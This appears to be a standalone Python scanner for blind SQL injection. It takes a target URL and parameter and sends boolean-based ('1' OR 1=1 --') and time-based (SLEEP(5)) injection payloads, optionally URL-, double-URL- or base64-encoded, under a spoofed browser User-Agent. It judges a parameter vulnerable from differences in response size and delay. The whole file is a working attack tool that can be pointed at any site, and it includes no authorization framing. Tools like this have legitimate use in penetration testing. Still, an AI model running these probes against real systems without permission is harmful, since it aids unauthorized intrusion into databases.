#!/usr/bin/env python3
import urllib.parse
import base64
import requests
import time
import argparse

TRUE_PAYLOADS = [
    "1' AND 1=1 --",
    "1 AND 1=1 --",
    "1' OR 1=1 --",
    "1 OR 1=1 --",
]

FALSE_PAYLOADS = [
    "1' AND 1=2 --",
    "1 AND 1=2 --",
    "1' OR 1=2 --",
    "1 OR 1=2 --",
]

TIME_BASED_PAYLOADS = [
    "1' AND SLEEP(5) --",
    "1 AND SLEEP(5) --",
    "1' OR SLEEP(5) --",
    "1 OR SLEEP(5) --",
]

ENCODINGS = ["none", "url", "double", "base64"]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def encode_payload(payload, method):
    if method == "url":
        return urllib.parse.quote(payload)
    elif method == "double":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif method == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif method == "none" or method is None:
        return payload
    else:
        print(f"Unknown encoding method: {method}")
        return payload

def boolean_based_sqli(url, param, encoding):
    sizes = []
    for payload in TRUE_PAYLOADS:
        encoded_payload = encode_payload(payload, encoding)
        try:
            response = requests.get(url, params={param: encoded_payload}, headers=HEADERS, timeout=10)
            if response.status_code == 200:
                sizes.append(len(response.text))
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")
    return sum(sizes) / len(sizes) if sizes else None

def boolean_based_errors(url, param, encoding):
    sizes = []
    for payload in FALSE_PAYLOADS:
        encoded_payload = encode_payload(payload, encoding)
        try:
            response = requests.get(url, params={param: encoded_payload}, headers=HEADERS, timeout=10)
            if response.status_code == 200:
                sizes.append(len(response.text))
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")
    return sum(sizes) / len(sizes) if sizes else None

def compare_response_sizes(url, param, encoding):
    try:
        baseline = requests.get(url, params={param: ""}, timeout=10)
        baseline_size = len(baseline.text)
    except requests.exceptions.RequestException as e:
        print(f"[!] Could not reach target: {e}")
        return False

    true_size = boolean_based_sqli(url, param, encoding)
    false_size = boolean_based_errors(url, param, encoding)

    if true_size is None or false_size is None:
        print("Could not retrieve valid responses for comparison")
        return False

    true_delta = abs(true_size - baseline_size)
    false_delta = abs(false_size - baseline_size)

    if true_size > false_size and true_delta < false_delta:
        print("[+] The parameter is likely vulnerable to Boolean Based Blind SQL injection")
        return True
    else:
        print("[-] The parameter is not likely vulnerable to Boolean Based Blind SQL injection")
        return False

def time_based_injections(url, param, encoding):
    for payload in TIME_BASED_PAYLOADS:
        encoded_payload = encode_payload(payload, encoding)
        try:
            start_time = time.time()
            requests.get(url, params={param: encoded_payload}, headers=HEADERS, timeout=15)
            end_time = time.time()

            if (end_time - start_time) > 5:
                print("[+] The parameter is likely vulnerable to Time Based Blind SQL injection")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")

    print("[-] The parameter is not likely vulnerable to Time Based Blind SQL injection")
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL to test")
    parser.add_argument("-p", "--param", required=True, help="Parameter to test")
    parser.add_argument("-e", "--encode", help="Encoding method (none, url, double, base64)", default="none")
    args = parser.parse_args()

    encoding = args.encode if args.encode else "none"

    if encoding == "all":
        for enc in ENCODINGS:
            print(f"[+] Testing with encoding: {enc}")
            if compare_response_sizes(args.url, args.param, enc):
                return
            if time_based_injections(args.url, args.param, enc):
                return
    else:
        if not compare_response_sizes(args.url, args.param, encoding):
            if not time_based_injections(args.url, args.param, encoding):
                print("[-] No SQL injection detected. Exiting...")

if __name__ == "__main__":
    main()

